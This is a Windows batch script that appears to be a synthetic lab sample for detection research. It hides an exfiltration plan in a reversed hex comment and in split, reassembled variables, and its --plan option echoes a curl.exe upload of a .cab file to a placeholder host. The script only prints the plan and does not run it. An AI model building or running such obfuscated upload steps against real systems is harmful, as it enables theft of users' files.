@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:hex_pairs|reverse
rem HUNTRESS-MATERIAL:64616f6c70752f64696c61766e692e656c706d6178652e633362336235313466332f2f3a73707474683d6c72755f64616f6c70757c6261632e633362336235313466332d7463656c6c6f635c62614c73736572746e75485c63696c6275505c73726573555c3a433d687461705f656372756f737c633362336235313466332d6e676961706d61633d64695f6e676961706d61637c656e6f6e3d65676175676e616c5f7478656e7c646e6f6d6169643d68706172677c313d746e756f635f65676174737c6578652e6c7275633d726574706164617c65746f6d65725f64616f6c70752c726566736e6172745f657261706572702c6c61636f6c5f657461636f6c3d73706574737c313d76
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "h0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=curl."
SeT "h1=exe|stage_count=1|graph=diamond|next_language=none|campaign_id=camp"
SeT "h2=aign-3f415b3b3c|source_path=C:\Users\Public\HuntressLab\collect-3f4"
SeT "h3=15b3b3c.cab|upload_url=https://3f415b3b3c.example.invalid/upload"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_opaque_branch=8c80b51e"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "cfg="
for %%G in (0 1 2 3) do call set "cfg=%%cfg%%%%h%%G%%"
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo curl.exe upload C:\Users\Public\HuntressLab\collect-3f415b3b3c.cab to https://3f415b3b3c.example.invalid/upload
exit /b 0
